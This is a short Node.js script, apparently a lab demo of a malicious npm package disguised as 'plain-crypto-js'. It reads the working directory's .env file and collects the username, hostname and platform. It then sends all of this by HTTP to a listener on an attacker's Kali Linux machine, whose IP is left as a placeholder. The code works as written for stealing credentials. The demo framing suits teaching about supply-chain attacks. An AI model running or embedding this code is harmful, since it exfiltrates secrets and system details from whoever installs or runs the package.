const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

const envFile = path.join(process.cwd(), ".env");

if (fs.existsSync(envFile)) {
    const envContent = fs.readFileSync(envFile, "utf8");
    console.log("👉 Step 1: Reading fake .env content...\n", envContent);
    
    const encodedEnv = encodeURIComponent(envContent);
    
    // 🔴 REPLACE 192.168.X.X WITH YOUR KALI LINUX IP ADDRESS
    const kaliUrl = `http://192.168.X.X:8000/collect?file=${encodedEnv}`; 
    
    console.log("📡 Step 2: Transmitting payload to Kali listener...");
    
    const req = http.request(kaliUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    }, (res) => {
        console.log(`✅ Step 4: Success! Server responded with status: ${res.statusCode}`);
    });

    req.on('error', (err) => {
        console.error("❌ Network Connection Error. Is your Kali IP correct? Error:", err.message);
    });

    req.write(systemPayload);
    req.end();
    
    console.log("📤 Step 3: Data sent. Keeping process alive briefly to finish stream...");
    
    setTimeout(() => {
        console.log("\n[plain-crypto-js] initialization logic complete.");
        process.exit(0);
    }, 1500);

} else {
    console.log("❌ Demo Error: Create a dummy '.env' file in this directory first!");
}
